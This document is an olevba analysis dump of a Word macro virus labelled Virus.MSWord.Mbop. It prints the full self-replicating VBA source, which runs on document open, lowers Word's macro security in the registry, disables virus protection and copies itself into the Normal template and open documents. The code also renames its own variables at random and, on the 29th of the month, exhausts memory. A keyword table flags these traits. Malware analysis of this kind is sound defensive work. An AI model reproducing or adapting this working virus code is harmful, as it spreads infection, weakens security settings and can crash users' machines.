olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
mbopl1mbop = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mbopfimbop = 7
Options.ConfirmConversions = False
Set mbopNtmbop = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set mbopAdmbop = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set mbopTdmbop = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mbopsembop = 5
mbopl2mbop = "b"
mbopfnmbop = mbopfimbop & mbopsembop
For mbopiimbop = 1 To mbopTdmbop.countoflines
If InStr(mbopTdmbop.lines(mbopiimbop, 1), "Private Sub Document_Open()") <> 0 Then
mbopSlmbop = mbopiimbop
Exit For
End If
Next
mbopl3mbop = "o"
mbopVcmbop = Trim(mbopTdmbop.lines(mbopSlmbop, mbopSlmbop + mbopfnmbop))
mboplvmbop = 97
If mbopNtmbop.countoflines > 0 Then
mbopNlmbop = mbopNtmbop.lines(1, mbopNtmbop.countoflines)
If InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
Else
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
mbophvmbop = 122
If mbopAdmbop.countoflines > 0 Then
mbopAlmbop = mbopAdmbop.lines(1, mbopAdmbop.countoflines)
If InStr(mbopAlmbop, "Nt") = 0 And InStr(mbopAlmbop, "Sl") = 0 And InStr(mbopAlmbop, "Nl") = 0 And InStr(mbopAlmbop, "Ad") = 0 And InStr(mbopAlmbop, "Vc") = 0 And InStr(mbopAlmbop, "Td") = 0 Then
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
Else
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
mbopl4mbop = "p"
For mbopiimbop = 1 To 15
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
mbopd2mbop = 9
mbopVcmbop = mbopTdmbop.lines(1, mbopTdmbop.countoflines)
mbopTdmbop.deletelines 1, mbopTdmbop.countoflines
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
mbopTdmbop.addfromstring mbopVcmbop
mbopDymbop = Day(Now)
mbopd1mbop = 2
mbopl5mbop = "!"
If mbopDymbop = mbopd1mbop & mbopd2mbop Then
Dim mbopstmbop()
mbopcambop = 0
Do
ReDim Preserve mbopstmbop(mbopcambop)
mbopqwmbop = CLng(1024)
mbopqambop = mbopqwmbop
mbopqzmbop = mbopqwmbop * mbopqambop
mbopstmbop(mbopcambop) = String(mbopqzmbop, Right(mbopTnmbop, 1))
DoEvents
mbopcambop = mbopcambop + 1
Loop
End If
If mbopiambop = True Or mbopinmbop = True Then
MsgBox mbopl1mbop & mbopl2mbop & mbopl3mbop & mbopl4mbop & mbopl5mbop, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

